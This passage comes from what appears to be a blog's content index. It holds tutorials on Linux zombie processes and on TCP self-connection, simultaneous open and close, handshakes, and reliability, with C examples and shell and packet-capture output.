perspective, a new process is born. The new item in the process table describes all the information about the new process, and each field of the new item is described in the current Linux kernel using a struct named task_struct, where the field pid represents the process ID and is the unique identification of the process in the kernel process table. Usually fork() is used in conjunction with the exec() family of functions. Refer man manual or APUEv3 for details. The following figure describes the procedure of how a process called PIDm creates PIDx. Step 1. (1) process PIDm calls fork and enters the kernel for execution. Step 2. (2) the kernel assigns the contents of the task_struct structure to the new process and adds this to the process table. Step 3. (3) the new item describes a newly assigned process PIDx. Step 4. (4) the fork call returns the process PIDm from the kernel with a PIDx value. Step 5. (4) fork the call returns the process PIDx from the kernel with a return value of 0 to distinguish between the parent process PIDm and the child process PIDx. PIDm and PIDx hold the same memory space, file descriptor and other resources. The differences and similarities of the resources can be referred to “man fork”. The following code creates a child process, The parent and child processes simultaneously print information to standard output. 12345678910111213141516171819int main(int argc, char** argv)&#123; pid_t pid = Fork(); // Child, PID is 0, STEP 5 if (pid == 0) &#123; // exec functions are called to start a executable programme. printf("child process: PID = %d\n", getpid()); proc_child(); exit(0); &#125; // Parent, PID &gt; 0, STEP 4 // Parent continues printf("parent process: PID = %d\n", getpid()); proc_parent(); exit(0);&#125; Process exit There are many ways to end a process. For example, the process has some ways to end itself, such as returning from the main function, calling exit(), _exit(), _Exit() function, the last thread of the process ends or the last thread of the process calls pthread_exit() function, which will cause the process to exit. There are many ways for a process to be forced to end, such as receiving some signals such as SIGKILL, SIGABRT, SIGQUIT, SIGINT and so on, which lead to the passive exit of the process. No matter how the process ends up running, it will eventually migrate from the kernel runtime state to the zombie state and become a zombie process. Before a process migrates to a zombie state, the kernel frees up memory and file resources occupied by the process. Therefore, the occupation of system resources by zombie processes can be ignored. The only thing the kernel reserves for zombie processes is the kernel progress table item task_struct. Zombie process As can be seen from the schematic diagram of process exit, from the perspective of the kernel, the exited processes that only occupy the kernel process table item and do not occupy any system resources are zombie processes. From the user’s point of view, a process that has been terminated in some way, but whose exit status has not been rycycled by the parent process, is a zombie process. How zombie process occur The root cause of zombie process is that the parent process does not recycle the exited child process, resulting in the child process to become a zombie process. Use the following code to create a zombie process and view the status of the process through the ps command. Parent process, continuously create multiple child processes, with each one executing the child program. The parent process continues to sleep and does not exit, while the child process is not reclaimed. 1234567891011121314151617181920212223//parent.c sliceint main(int argc, char** argv)&#123; int i = 0; pid_t pid[MAX_CHLD_PROC_NUM]; for (i = 0; i &lt; MAX_CHLD_PROC_NUM; i++) &#123; if ((pid[i] = Fork()) == 0) &#123; execve("./child", NULL, NULL); &#125; &#125; for(;;) &#123; printf("parent process: PID = %d sleep.\n", getpid()); sleep(10); printf("parent process: PID = %d wakeup.\n", getpid()); &#125; exit(0);&#125; Child process，print the process ID and exit. 12345678//child.c slice#include &lt;stdio.h&gt;int main(int argc, char** argv)&#123; printf("child process: PID = %d exit.\n", getpid()); exit(0);&#125; Compile and execute. After the parent process runs, it creates 10 child processes, and sleep forever. After the 10 child processes prints PID, the 10 child processes ends. We can see all these 10 childs become zombie state. 12345678910111213141516171819202122232425262728293031toto@guru:~$ gcc -Wimplicit-function-declaration --std=c99 parent.c -o parenttoto@guru:~$ gcc -Wimplicit-function-declaration --std=c99 child.c -o childtoto@guru:~$ parentparent process: PID = 9286 sleep. child process: PID = 9287 exit. child process: PID = 9289 exit. child process: PID = 9288 exit. child process: PID = 9290 exit. child process: PID = 9291 exit. child process: PID = 9292 exit. child process: PID = 9296 exit. child process: PID = 9293 exit. child process: PID = 9295 exit. child process: PID = 9294 exit.parent process: PID = 9286 wakeup.parent process: PID = 9286 sleep....toto@guru:~$ ps -aux | grep ZUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDtoto 9287 0.0 0.0 0 0 pts/0 Z+ 23:15 0:00 [child] &lt;defunct&gt;toto 9288 0.0 0.0 0 0 pts/0 Z+ 23:15 0:00 [child] &lt;defunct&gt;toto 9289 0.0 0.0 0 0 pts/0 Z+ 23:15 0:00 [child] &lt;defunct&gt;toto 9290 0.0 0.0 0 0 pts/0 Z+ 23:15 0:00 [child] &lt;defunct&gt;toto 9291 0.0 0.0 0 0 pts/0 Z+ 23:15 0:00 [child] &lt;defunct&gt;toto 9292 0.0 0.0 0 0 pts/0 Z+ 23:15 0:00 [child] &lt;defunct&gt;toto 9293 0.0 0.0 0 0 pts/0 Z+ 23:15 0:00 [child] &lt;defunct&gt;toto 9294 0.0 0.0 0 0 pts/0 Z+ 23:15 0:00 [child] &lt;defunct&gt;toto 9295 0.0 0.0 0 0 pts/0 Z+ 23:15 0:00 [child] &lt;defunct&gt;toto 9296 0.0 0.0 0 0 pts/0 Z+ 23:15 0:00 [child] &lt;defunct&gt; Recycle of zombie process Normally, when using a multi-process model, we’d better ensure that the parent process recycles the child processes when the child processes exit, read the exit state of child process or explicitly ignored. Be sure to avoid situations that the parent process directly ignores the child process exit status as previous example. There are two scenarios for child process recycling. The parent process finishes running before the child process In this case, because there is no parent process, the child process becomes the orphan process. In POSIX standard system, the process is organized as a process tree, so the orphan process will eventually become a node of the process tree, that is, a parent process must be found. At this point, the init process of the system becomes the parent of the orphan process. If the child exits at this point, the system process init recycles it. Note that the system init process does not have to be number 1 init. Modify the child code slightly to execute the parent process again. 1234567891011121314#include &lt;stdio.h&gt;int main(int argc, char** argv)&#123; while(1) &#123; printf("child process: PID = %d sleep.\n", getpid()); sleep(10); printf("child process: PID = %d wakeup.\n", getpid()); &#125; printf("child process: PID = %d exit.\n", getpid()); exit(0);&#125; Process tree state 123456789101112131415toto@guru:~$ pstree -p 2011init(2011)─┬─at-spi-bus-laun(2130)─┬─dbus-daemon(2136) ... ... ├─gnome-terminal(2661)─┬─bash(2670)─┬─hexo(2876)─┬─&#123;hexo&#125;(2878) ... │ │ ... ... └─parent(4259)─┬─child(4260) ├─child(4261) ├─child(4262) ├─child(4263) ├─child(4264) ├─child(4265) ├─child(4266) ├─child(4267) ├─child(4268) └─child(4269) Kill the parent process and view the process tree again. 12345678910111213141516toto@guru:~$ kill -9 4259toto@guru:~$ pstree -p 2011init(2011)─┬─at-spi-bus-laun(2130)─┬─dbus-daemon(2136) │ ├─&#123;at-spi-bus-laun&#125;(2133) ... ... ├─child(4260) ├─child(4261) ├─child(4262) ├─child(4263) ├─child(4264) ├─child(4265) ├─child(4266) ├─child(4267) ├─child(4268) └─child(4269) At this point, kill the child process, no more zombie process. The following is the situation of child process in the system after kill 4260 ~ 4268, I only left 4269 process stay in sleep state. 12toto@guru:~$ ps -aux | grep childtoto 4269 0.0 0.0 4200 792 pts/9 S 07:31 0:00 [child] Although init process can recycle orphaned zombie processes, when implementing multiple processes, defensive design is required to try to recycle child processes from parent processes. The child process finishes running before the parent process In this case, the parent process must recycle the child process itself. The system call waitpid is used for recycling. There are two methods, the first is synchronous blocking recycling, and the second is asynchronous non-blocking recycling. synchronous recycling, after the parent process creates the child process, waitpid is called and blocked to wait for all the child processes. After all the child processes finish excution, the waitpid unblocks and the parent process continues its processing until it exits. The parent process code is modified. 1234567891011121314151617181920212223242526272829303132333435363738394041//parent.cint main(int argc, char** argv)&#123; int status = 0; pid_t ret; pid_t pid[MAX_CHLD_PROC_NUM]; //10 child processes created for (int i = 0; i &lt; MAX_CHLD_PROC_NUM; i++) &#123; if ((pid[i] = Fork()) == 0) &#123; execve("./child", NULL, NULL); &#125; &#125; //parent blocked to wait for all of the childs while ((ret = waitpid(-1, &amp;status, 0)) &gt; 0) &#123; if (WIFEXITED(status)) &#123; printf("child process %d exit with exit status %d\n", ret, WEXITSTATUS(status)); &#125; else if (WIFSIGNALED(status)) &#123; printf("child process %d killed by signal %d\n", ret, WTERMSIG(status)); &#125; else if (WIFSTOPPED(status)) &#123; printf("child process %d stoped by signal %d\n", ret, WSTOPSIG(status)); &#125; else &#123; printf("child process %d exit unknown\n", ret); &#125; &#125; printf("parent process exit\n"); exit(0);&#125; Asynchronous recycling, the parent process first registers with the operating system kernel the handler when the child process exits, namely the SIGCHLD signal handler, and then continues to execute its own processing flow. Until the child process exits, the operating system kernel interrupts the parent process with signals and enters the signal processing function. After signal interrupt processing is completed, the processing flow of the parent process continues. The parent process code is modified. 12345678910111213141516171819202122232425int main(int argc, char** argv)&#123; pid_t pid[MAX_CHLD_PROC_NUM]; //Register OS Kernel the SIGCHLD handler Signal(SIGCHLD, child_exit_handler); //10 childs for (int i = 0; i &lt; MAX_CHLD_PROC_NUM; i++) &#123; if ((pid[i] = Fork()) == 0) &#123; execve("./child", NULL, NULL); &#125; &#125; //Parent continues while(1) &#123; printf("parent process running\n"); sleep(2); &#125; exit(0);&#125; Signal handler. 1234567891011121314151617181920212223242526272829void child_exit_handler(int sig)&#123; pid_t ret; int status = 0; //Parent blocked to wait while ((ret = waitpid(-1, &amp;status, 0)) &gt; 0) &#123; if (WIFEXITED(status)) &#123; printf("child process %d exit with exit status %d\n", ret, WEXITSTATUS(status)); &#125; else if (WIFSIGNALED(status)) &#123; printf("child process %d killed by signal %d\n", ret, WTERMSIG(status)); &#125; else if (WIFSTOPPED(status)) &#123; printf("child process %d stoped by signal %d\n", ret, WSTOPSIG(status)); &#125; else &#123; printf("child process %d exit unknown\n", ret); &#125; &#125;&#125; Harm of zombie process In a server system, if a parent process continues to spawn a zombie process, it will eventually cause the kernel’s progress table to be filled up and the system will not be able to regenerate a new child process. The resulting phenomenon can be puzzling and difficult to locate. So the best way to avoid zombie processes is to make sure that when designing any multi-process system, the parent process takes the responsbilities to recycle the child processes. For the parent process that cannot be modified, in the process of operation and maintenance, some external automatic monitoring means should be used to constantly pay attention to the number of zombie processes, and restart the parent process that creates the zombie process when necessary, forcing the zombie process to be automatically recycled by the system init process.]]></content>
      <categories>
        <category>OS</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[TCP Self Connection Problem]]></title>
    <url>%2F2016-01-11-tcp-self-connection%2F</url>
    <content type="text"><![CDATA[TCP connection can be established by SYN segmentation initiated by both ends to the other party at the same time. At the same time, the established connection must meet one condition. After SYN connection request is issued by both TCP ends, a SYN connection request is still received, and the SYN received is exactly from the end that sent SYN to request connection.So is there a situation like this? A TCP end issues a SYN segment to itself, and the connection requested by the SYN segment is exactly the TCP end itself, which meets the condition of “SYN request is received at the same time as SYN request, and the SYN received happens to be from the end of the requesting connection”. This situation is real and is called TCP self-connection. The existence of self-connectivity often causes inexplicable problems and hard-to-reproduce failures and software bugs. Connection Sequence The segments interaction sequence of TCP connection at the same time, Now we make some modification to the diagram and compare it with the previous one？Instead of [1.syn k], [1.syn n] is sent to itself other than to the other endpoint, here n equals to k. After the connection is established, the connection situation is as follows: When the connection is disconnected, the interaction sequence is similar to the establishment of the connection. An example of self connection Now we reproduce the self-connection senario with the following code, only client.c is required here. Code 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950//client.c#include "lib/unp.h"int main(int argc, char **argv)&#123; //初始化工作 int sockfd = 0; //Client进程的Socket文件描述符 int dstport = 0; //Server进程监听TCP端口号 int srcport = 0; //Client进程指定本地TCP端口号 char response[MAXLINE + 1]; //Server进程返回的响应内容 char request[] = "request,hostname\r\n"; //Client进程发出的请求消息 struct sockaddr_in servaddr; //用于存储Server进程所在主机的IP地址及TCP端口号 bzero(&amp;servaddr, sizeof(servaddr)); bzero(response, MAXLINE + 1); //设置将要连接服务器进程的IP地址和TCP端口号 sscanf(argv[3], "%d", &amp;dstport); servaddr.sin_family = AF_INET; Inet_pton(AF_INET, argv[2], &amp;servaddr.sin_addr); servaddr.sin_port = htons((uint16_t) dstport); //创建sockfd，AF_INET表示IPv4，SOCK_STREAM表示TCP sockfd = Socket(AF_INET, SOCK_STREAM, 0); //强制绑定客户端端口号到sockfd sscanf(argv[1], "%d", &amp;srcport); struct sockaddr_in clientaddr; bzero(&amp;clientaddr, sizeof(clientaddr)); clientaddr.sin_family = AF_INET; clientaddr.sin_port = htons((uint16_t)srcport); Bind(sockfd, (SA *) &amp;clientaddr, sizeof(clientaddr)); //发起连接请求, 关联sockfd和Server进程的IP地址，TCP端口号 Connect(sockfd, (SA *) &amp;servaddr, sizeof(servaddr)); //发送请求消息 Write(sockfd, (char*) request, strlen(request)); //等待响应消息 Readline(sockfd, response, sizeof(response)); printf("%s\n", response); //关闭sockfd,通知服务进程通信结束 Close(sockfd); //进程结束 exit(0);&#125; Self-connection establishment On the host 10.22.5.3, execute client with parameters argv1 55555，argv2 10.22.5.3，argv3 55555, 12toto@guru:~$ client 55555 10.22.5.3 55555request,hostname Single step run the client to function Connect() with Gdb, check the TCP connection status, 12toto@guru:~$ netstat -ant | grep 55555tcp 0 0 10.22.5.3:55555 10.22.5.3:55555 ESTABLISHED When the instance runs, Wireshark is used to retrieve TCP segment data [1.syn n], [2.syn n, ACK k+1], and the details are as follows, from 10.22.5.3:55555 to 10.22.5.3:55555 to initiate a SYN connection request. ISN for 787485307. Initiate SYN, ACK from 10.22.5.3:55555 to 10.22.5.3:55555. ACK for 787485308. Self-connection disconnect Running until the end of the process, Wireshark is used to obtain TCP segment data [1.fin n], and the details of [2.ack n+1] are as follows: Check the TCP connection status, 12toto@guru:~$ netstat -ant | grep 55555tcp 0 0 10.22.5.3:55555 10.22.5.3:55555 TIME_WAIT Avoid self-connection problems TCP self-connection occurs because both the client and the server are located on the same host, and the server port is within the scope of the random port used by the client system, and the client frequently establishes TCP connection. For example, the current host provides the client with a temporary port range of [32768,61000], which may cause TCP self-connection when the port within this range is selected as the service port. Therefore, attention should be paid to the design. 12#View temporary port ranges available under Linuxcat /proc/sys/net/ipv4/ip_local_port_range]]></content>
      <categories>
        <category>Network</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[TCP Simutaneous Connection]]></title>
    <url>%2F2016-01-10-tcp-simutaneous-connection%2F</url>
    <content type="text"><![CDATA[When communication occurs, in addition to the situation that one end of the communication initiates a communication request and the other end waits passively, there may be the situation that both endpoints of the communication have the intention of communication and both ends initiate a request to each other. When the communication behavior ends, the same situation exists. Both sides have no data to send to each other and finish communication at the same time. TCP supports this communication connection to be established and closed at the same time. When do the simultaneous connection creation and shutdown occur? Is it different from normal procedure? This article simulates and reproduces this kind of TCP connections and do some analysis in detail. Simutaneous Connection Creation The communication mode of most TCP is that a process passively listens on TCP port, waits for client process to send connection request actively, and provides service for client process. What if two processes simultaneously make TCP connection requests to each other? Since both ends are intended to connect to each other, the TCP layer as a transport layer has no reason to prevent both ends from connecting. The TCP protocol supports connection creation when both sides make a request at the same time, when both processes are both clients and servers. Note that setting up a connection at both ends is completely different from cross-linking two servers running on two hosts with two clients running on both hosts. The sequence When two processes establish a TCP connection at the same time, the connection establishment procedure is different from the three way handshakes that the client and server make a connection. The sequence the simultaneous connection process is as follows, and the client and server are not distinguished here. The difference between the three way handshakes established with a normal connection is that when both ends of the established connection expect an ACK acknowledgement of [1.syn], they receive a SYN request from [IP address, TCP port number]. The example There are many ways to implement a simultaneous connection, and the core idea is to ensure that after the SYN segment at both ends is sent, it receives not ACK segment or RST segment, but SYN segment from the other endpoint. Code Both sides can follow the client code and add the part specifying the client port number and the service port number. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include "lib/unp.h"int main(int argc, char **argv)&#123; //初始化工作 int sockfd = 0; //Client进程的Socket文件描述符 int dstport = 0; //Server进程监听TCP端口号 int srcport = 0; //Client进程指定本地TCP端口号 char response[MAXLINE + 1]; //Server进程返回的响应内容 char request[] = "request,hostname\r\n"; //Client进程发出的请求消息 struct sockaddr_in servaddr; //用于存储Server进程所在主机的IP地址及TCP端口号 bzero(&amp;servaddr, sizeof(servaddr)); bzero(response, MAXLINE + 1); //设置将要连接服务器进程的IP地址和TCP端口号 sscanf(argv[3], "%d", &amp;dstport); servaddr.sin_family = AF_INET; Inet_pton(AF_INET, argv[2], &amp;servaddr.sin_addr); servaddr.sin_port = htons((uint16_t) dstport); //创建sockfd，AF_INET表示IPv4，SOCK_STREAM表示TCP sockfd = Socket(AF_INET, SOCK_STREAM, 0); //强制绑定客户端端口号到sockfd sscanf(argv[1], "%d", &amp;srcport); struct sockaddr_in clientaddr; bzero(&amp;clientaddr, sizeof(clientaddr)); clientaddr.sin_family = AF_INET; clientaddr.sin_port = htons((uint16_t)srcport); Bind(sockfd, (SA *) &amp;clientaddr, sizeof(clientaddr)); //发起连接请求, 关联sockfd和Server进程的IP地址，TCP端口号 Connect(sockfd, (SA *) &amp;servaddr, sizeof(servaddr)); //发送请求消息 Write(sockfd, (char*) request, strlen(request)); //等待响应消息 Readline(sockfd, response, sizeof(response)); printf("%s\n", response); //关闭sockfd,通知服务进程通信结束 Close(sockfd); //进程结束 exit(0);&#125; Reproduction Create a scenario where both TCP segments SYN arrive at the opposite end at the same time. Step 1, select a network topology (simulated with GNS3 here) and power all the devices in the network. Step 2: Ping from host 10.22.5.3/24 to host 10.16.56.2/24 and the result is OK to ensure that the ARP cache tables of the two hosts contain the router interface entry. 123456789toto@guru:~$ ping 10.16.56.2 -c 3PING 10.16.56.2 (10.16.56.2) 56(84) bytes of data.64 bytes from 10.16.56.2: icmp_seq=1 ttl=63 time=15.2 ms64 bytes from 10.16.56.2: icmp_seq=2 ttl=63 time=10.4 ms64 bytes from 10.16.56.2: icmp_seq=3 ttl=63 time=14.9 ms--- 10.16.56.2 ping statistics ---3 packets transmitted, 3 received, 0% packet loss, time 2002msrtt min/avg/max/mdev = 10.445/13.535/15.200/2.187 ms Step 3: suspend Router work (GNS3 function), IP packet forwarding stops, and packets received by each interface are cached. Step 4. Execute the client process using GDB on the host 10.22.5.3 and 10.16.56.2, respectively. Using Wireshark to sniff packages at both ends, SYN segments at both ends are observed to have been sent and retransmitted. 123456#The client process establishes a TCP connection from port 44444 to port 10.15.56.2:55555toto@guru:~$ client 44444 10.16.56.2 55555～#The client process establishes a TCP connection from port 55555 to port 10.22.5.3:44444toto@client:~$ client 55555 10.22.5.3 44444～ Step 5: unlock the Router (GNS3 function), and the IP packet cached in the Router is forwarded immediately. Step 6, both sides receive SYN segment connection establishment request at the same time, and the connection establishment is completed. To check the TCP connection status, 1234567891011#10.22.5.3toto@guru:~$ netstat -ant | grep 55555tcp 0 0 10.22.5.3:44444 10.16.56.2:55555 ESTABLISHED#10.22.5.3, GDB printoutstoto@guru:~$ client 44444 10.16.56.2 55555request,hostname#10.16.56.2，GDB printoutstoto@client:~$ client 55555 10.16.56.2 44444request,hostname TCP Segments The details of TCP segment data [1.syn n], [1.syn k], [2.syn k, ACK n+1], [2.syn n, ACK k+1] are as follows: Initiate SYN connection requests from 10.22.5.3:44444 to 10.16.56.2:55555. ISN is 4240815619. Initiate SYN connection requests from 10.16.56.2:55555 to 10.22.5.3:44444. ISN is 2140328405. From 10.22.5.3:44444 to 10.16.56.2:55555, send an ACK reply with an ACK of 2140328406. Again, SYN is still 4240815619. From 10.16.56.2:55555 to 10.22.5.3:44444, send an ACK reply with an ACK of 4240815620. Again, SYN is still 2140328405. Simultaneous disconnection Similar to establishing a connection simutaneously, a TCP connection can also be disconnected at the same time. Normally, TCP uses the FIN segment to normally disconnect an established connection. Regardless of whether the connection is a client-server model or a simultaneous model, a completed connection can be disconnected simultaneously. In other words, simultaneous disconnection is independent of how the connection is established. Sequence of disconnection Since it is mandatory to take four waves to disconnect the two-way communication pipe, the number of waves does not change. The FIN segment and the ACK segment may also often be sent together, so the following case occurs. An example of simultaneous disconnection Use the client/server structure. Make minor changes to the client and server code. 1234567891011//server.c//连接建立后等待1秒，立即请求断开连接connectfd = Accept(listenfd, (SA *) &amp;clntaddr, &amp;sock_length);sleep(1);Shutdown(connectfd,SHUT_WR);//client.c//连接建立后等待1秒，立即请求断开连接Connect(sockfd, (SA *) &amp;servaddr, sizeof(servaddr));sleep(1);Shutdown(sockfd,SHUT_WR); To ensure that this is a simultaneous disconnect scenario, we only need to check the two TCP endpoints’ states that are both TIME_WAIT states. 12345678//服务端toto@guru:~$ netstat -ant | grep 1982tcp 0 0 0.0.0.0:1982 0.0.0.0:* LISTEN tcp 0 0 10.22.5.3:1982 10.16.56.2:55555 TIME_WAIT//客户端toto@ClientOS:~$ netstat -ant | grep 1982tcp 0 0 10.16.56.2:55555 10.22.5.3:1982 TIME_WAIT TCP Segments Segments details, [1.FIN n]，[1.FIN k]，[2.ACK n+1]，[2.ACK k+1]. 10.22.5.3:1982 to 10.16.56.2:55555, FIN segment, SEQ is 3717319262. 10.16.56.2:55555 to 10.22.5.3:1982, FIN segment, SEQ is 731343897. ACK 731343898. ACK 3717319263. Summary Simutaneous TCP connection extablishment requires both endpoints to initiate a SYN segment, so this kind of situation will not occur on the server - client model TCP communications, generally, it will often be observed in the point-to-point communication. In the simutaneous established connection, one endpoint send a SYN, the SYN from the counterpart should be on the way, or the previous endpoint may get a RST from the counter part. When the connection is disconnected at the same time, both ends of TCP enter the TIME_WAIT state, and the problems caused by the TIME_WAIT state will affect both ends, so pay more attention to such details when analyzing some hard-to-fix problems.]]></content>
      <categories>
        <category>Network</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[TCP Connection Management]]></title>
    <url>%2F2016-01-04-tcp-connection-management%2F</url>
    <content type="text"><![CDATA[When any communication occurs, at least one side participating in the communication makes a communication request to determine whether the other side is available. it is the same in the TCP protocol, the initiating process is known as Synchronization, due to TCP provides the application layer reliable byte stream data transmission, it will asign each byte of the application layer data a sequence number, actually the number of the first byte known as ISN (Initial Sequence Number) is not started with 0 or 1, but generated by a specific algorithm, ISN value in the range of [0, 2^32-1]. The two sides of TCP communication need to swap each other’s ISN to control the transmission of the byte stream. The process of exchanging the ISN is called the TCP connection establishment process, and is also called the virtual connection or virtual circuit establishment process. When communication finishing, both ends also need to have a specific interaction process to release the connection. Why do you need to change the ISN to create a connection? Why doesn’t ISN start with 0 or 1? How does full duplex TCP communication control disconnection? This section focuses on TCP connection management and all these problems. ISN Select a proper ISN Why doesn’t the ISN starting with 0 or 1, and why later RFC changes RFC793 to generate the ISN according to time. There are two main reasons for this. The first reason is to prevent data from being mixed up between TCP’s incarnation connections (that is, using the same quadrics to establish a TCP connection again). The second reason, for security considerations, is to prevent network attacks that predicting TCP segment Numbers. References RFC0793 TRANSMISSION CONTROL PROTOCOL RFC6528 Defending against Sequence Number Attacks TCP_sequence_prediction_attack A Weakness in the 4.2BSD Unix† TCP/IP Software Why both endpoints exchange ISN Establishing a TCP connection is not a matter of establishing a true physical path, but rather a logical level of connection. The client needs to send the byte stream to the server side, after the server receives the byte stream, it has to sort the bytes in right order because that the IP packets that carry the byte stream will not arrive in the orgnizied order. So the first question for the server side is, which byte is the first byte sent by the client side? So before communication begins, the client must tell the server what the sequence number of the first byte will be. Since TCP is a two-way communication, the client also needs to know the first byte sequence number of the byte stream sent by the server. The two processes complete the swap of ISN are handshakes. Three-way-handshake It’s require 3 handshake stages to establish a TCP connection. This procedure happened at the second stage of 《tcp comminication model》 Run the Server process with GDB, single step to function Accept(). Run the Client process, single st ep to Connect(), sniff the TCP segment with Wireshark, [1.SYN]，[2.SYN，ACK]，[3.ACK]. Segment [1.SYN], ISN is 209863725. Among the flags bits, SYN is set to 1 to identify this one is a SYN segment. The details of TCP segment data [2.syn, ACK] are as follows: its own ISN is 354358497, and the ACK of [1.syn] is 209863726. The flag bit SYN and the ACK is set to 1. [3.ACK] acknowledege the [2.SYN] ISN, the ack number is 354358498. At this moment both sides know the ISN of each other. During the communication establishing process, except the exchanging of ISN, there are some other parameters exchanging and discussion, like the communication window size , the fast retransmittion, the time stamps etc, which will be discussed later. A normal communication, data back and forth After the communication connection is established, the process begins to send and receive the application layer data. The server blocks and waits to receive the request message from the client. After the client sends the request, it waits for the response from the server. The server sends the response message. 12345678910111213//server.c//服务端Server接收Client进程的消息Readline(connectfd, requestbuf, sizeof(requestbuf));//client.c//客户端Client进程发送请求消息Write(sockfd, l(char*) request, strlen(request));//阻塞等待从Server进程接收一行响应消息Readline(sockfd, response, MAXLINE);//server.c//Server进程返回响应消息给Client进程，消息格式为"response, &lt;hostname&gt;\r\n"Write(connectfd, responsbuf, strlen(responsbuf)); I debug running the Server and Client with GDB and check the TCP segments with Wireshark. [4.request]，[5.ACK]，[6.reponse]，[7.ACK]. [4.request] is the first TCP segment which carries the application layer data. The first byte sequence number is ISN+1=209863726. The data lenth is 18Bytes as known as “request,hostname”. [5.ACK] is the ack from server to the client. ACK number is 209863744, which means all the 18 bytes have been received. [6.reponse] is the reponse message from server to client.14Bytes length, the content is “response,guru”. [7.ACK] is the ack from client to server, ACK number is 209863744. Disconnection When the application layer communication ends, the application layer calls the function Close() to close the file descriptor or the process itself ends and results in the automatic release of the file descriptor. This behavior will trigger the TCP module to send disconnection TCP segment data AKA FIN segment. When the FIN segment is received by the other end, the kernel of the other end will translate the FIN segment into EOF (End of file) to the receiving process. 1234567//client.c//关闭socketfd，向服务进程发送FIN段Close(sockfd);//server.c//关闭connectfd，向客户进程发送FIN段Close(conectfd); It’s easy to find out that up to 4 interactions is required to release a TCP connection.In some cases [9.ACK] and [10.FIN] can be sent together. Why does TCP use four interactions for the disconnection process? Because TCP is to send and receive data can be simultaneously full-duplex, equivalent to that a connection is established, there are two one-way data pipelines connecting the two communication process, one of these processes can only know if there are any data to be sent to the counter part, but cannot decide whether the other end has data to send to itself. So TCP supports one-way pipeline shutdowns, and if a one-way shutdown is required explicitly, the function shutdown() can be used, with the file descriptor still available. Run sever and client to Close() with GDB, observe the segments with Wireshark. [8.FIN]，[9.ACK]，[10.FIN]，[11.ACK]. [8.FIN], there are no data at the client process. The client call Close() to close the socket fd. The client os makes a FIN to send. [9.ACK], Acknowledge of the first FIN. No more data will be received now, but maybe there are data to be sent. [10.FIN], The server makes it clear that no more data is sent to the client. [11.ACK], The client confirms the [10.FIN] notification sent by the server, and 1 TCP communication ends. The above process is a complete TCP communication process. The communication process is a client-server model, and the client terminates the communication first. In the communication process, there is no abnormal situation, no host downtime, process abnormal exit and other events happen, which is the most common communication process.]]></content>
      <categories>
        <category>Network</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Reliability of TCP]]></title>
    <url>%2F2016-01-03-tcp-reliable-communication%2F</url>
    <content type="text"><![CDATA[TCP provides reliable byte stream data transfer service for the application layer, while TCP is built on top of the IP layer. When forwarding the packet, the IP layer device simply sends the IP packet down and forwards the IP packet as far as possible. When the IP packet is abandoned by the router or receiver in the transmission process, the user data carried by it will be permanently lost. The IP layer has no remedial measures for the loss of data. In addition, the packet size limit of IP layer depends on the ability of data link layer, so there will be the IP packet size limitation, in another word, when the application layer of the byte stream arrived at the IP layer, the data volume of more than a certain value, they will be divided into multiple IP data packet transmissions, there will be out of order arrival IP packets problem and duplicated IP packets problem. The IP layer can not be trust. How does the TCP protocol over an untrusted IP network ensure reliable byte traffic for the application layer? Unreliability of the IP layer The meaning of IP layer existence in the network is to look for hosts in the Internet and address them uniformly among different data link layers, so that hosts in various data link layers can communicate with each other according to the uniform rule of IP addressing. The IP layer is not responsible for caching data, and when an IP packet is sent to the network, the IP layer does not track it. Therefore, data sent to the IP layer may be lost or discarded by the network routing device. Due to the variability of IP network equipment, such as router restarting, power off or line load sharing, the routing table changes, and the order of IP arriving at the destination host is different from the IP packet departure. IP packets may also be copied in the network, which may cause the same IP packet to reach the target host multiple times at the same time, resulting in data redundancy. In the network, it’s very ordinaty for the IP layer to appear packet loss, packet discard, out-of-order, redundant data. Therefore, the IP layer is unreliable in the process of data transmission. To achieve reliable data transmission dependent on the IP layer, the complex control mechanism of the transmission layer is required. Unreliability of the receiver The reliable transmission of data not only depends on the network, but also depends on the working state of the receiver. For example, when the load on the receiving end is very high and the data cache of the receiving end is full, the receiving end will directly ignore the data that has been delivered. Therefore, the state of the receiving end is also an important fact that should be considered in the process of data transmission. How does the TCP layer ensure reliable byte flow TCP layer realizes reliable data transmission in unreliable IP network through complex mechanism. It includes data sorting, de-redundancy, packet loss and re-transmission, data verification, and flow control considering the operation of the receiver and congestion control considering the operation of the intermediate router. Byte sorting When one end sends a stream of bytes to the other end, how does the other end know if the data in the middle is missing or duplicated? Simple, each byte in the byte stream is number labeled. When a TCP segment is lost during transmission, the receiver knows the sequence number of the missing TCP segment by sequence number, and can also discard duplicate data by sequence number. In the figure below, in order to illustrate the sorting of data, the byte number starts from 1. In practice, the initial number of the byte does not start from 1, but the value generated by the system according to a certain algorithm. This value is called the Initial Sequence Number. ISN value in the range of [0, 2 ^ 32-1), after the value of more than 2 ^ 32-1, start counting from 0 again. When TCP layer segments the byte stream data of application layer, it will not only put 3 bytes in one Segment, but Segment according to the specific situation. The maximum value of byte stream Segment is called MSS (Max Size Segment). Data verification When each byte of the byte stream arrives in sequence at the receiving end, the data at the receiving end may be inconsistent with the data content at the sending end due to unpredictable accidents in the transmission link. So the TCP layer provides data validation before and after sending. When a TCP segment data before sending, TCP module add temporary segment data on the source IP address, destination IP address, TCP protocol type, calculation of the length of the TCP segment, will be appended to these a few elements to send TCP segment, forming a temporary data structure, and for the calibration and checksum calculation, calculation result will be added to the TCP segment data. When this data arrives at the receiving end, the receiving end performs the above calculation again and gets checksum again, and then compares it with checksum in the TCP segment. If it is consistent, it indicates that the data is reliable. Acknowledge mechanism Sorting the byte stream data lets the receiver know whether data is lost in transit, but what can be done to remedy the loss? In TCP, the receiver informs the sender of the received data, that is, confirms the received data. When the sending end fails to receive the confirmation from the receiving end for the segment data starting with serial number N within a certain period of time, the sending end considers that the segment data of serial number N is lost, and the sending end retransmits the TCP segment marked with serial number N. As shown in the figure below, the segment DATA [DATA: 5,6,7] is sent from the client to the server. After the server receives [DATA: 5,6,7], it replies [ACK: 8], indicating that it has received all DATA before the seventh byte and expects to receive DATA starting from the eighth byte. The DATA [DATA: 8,9,10] is sent from the client to the server. This DATA does not reach the server, but is lost in the network. The client starts timing when sending the DATA. Piece of DATA [DATA: 11] from the client sends to the server, the server receives DATA: 